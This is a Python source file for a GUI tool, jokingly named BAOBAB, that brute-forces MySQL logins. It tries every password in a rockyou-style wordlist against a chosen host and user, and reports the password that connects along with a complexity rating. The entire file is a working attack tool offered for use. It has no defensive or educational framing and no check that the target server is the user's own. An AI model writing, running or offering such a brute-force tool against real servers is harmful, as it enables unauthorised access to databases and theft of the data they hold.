from tkinter import filedialog
import customtkinter as ctk
import threading
import mysql.connector
import re
import time

# ANSI color codes for console (unused in GUI, kept for potential CLI usage)
class Colors:
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

# Function to classify password complexity
def classify_password(password):
    if re.match(r"^(?=.*[0-9])(?=.*[!@#$%^&*])[a-zA-Z0-9!@#$%^&*]{2,}$", password):
        return "[High]"
    elif re.match(r"^(?=.*[0-9])[a-zA-Z0-9]{2,}$", password):
        return "[Medium]"
    else:
        return "[Low]"

# Function to attempt MySQL login
def brute_force_mysql(host, user, wordlist_path, output_label, delay=0):
    try:
        with open(wordlist_path, 'r', encoding='utf-8') as file:
            for password in file:
                password = password.strip()
                output_label.configure(text=f"Current attempt: {password}")
                try:
                    connection = mysql.connector.connect(
                        host=host,
                        user=user,
                        password=password
                    )
                    if connection.is_connected():
                        connection.close()
                        output_label.configure(text=f"Password found: {password}, Complexity: {classify_password(password)}")
                        return
                except mysql.connector.Error:
                    time.sleep(delay)
        output_label.configure(text="Password not found or error occurred")
    except Exception as e:
        output_label.configure(text=f"Error: {e}")

# GUI Setup
def setup_gui():
    window = ctk.CTk()  # Using customtkinter
    window.title("BAOBAB : Best And Overpowered Beating Ass Brute-force")

    # Host input
    ctk.CTkLabel(window, text="MySQL Host:").pack()
    host_input = ctk.CTkEntry(window)
    host_input.pack()

    # User input
    ctk.CTkLabel(window, text="MySQL User:").pack()
    user_input = ctk.CTkEntry(window)
    user_input.pack()

    # Wordlist path input
    ctk.CTkLabel(window, text="Path to rockyou.txt:").pack()
    wordlist_frame = ctk.CTkFrame(window)
    wordlist_frame.pack()
    wordlist_input = ctk.CTkEntry(wordlist_frame)
    wordlist_input.pack(side='left', fill='x', expand=True)
    ctk.CTkButton(wordlist_frame, text="Browse", command=lambda: wordlist_input.insert(0, filedialog.askopenfilename())).pack(side='right')

    # Output label
    output_label = ctk.CTkLabel(window, text="Ready")
    output_label.pack()

    # Start button
    start_button = ctk.CTkButton(window, text="Start Brute-Force", command=lambda: threading.Thread(target=brute_force_mysql, args=(host_input.get(), user_input.get(), wordlist_input.get(), output_label)).start())
    start_button.pack()

    window.mainloop()

# Run the GUI
setup_gui()
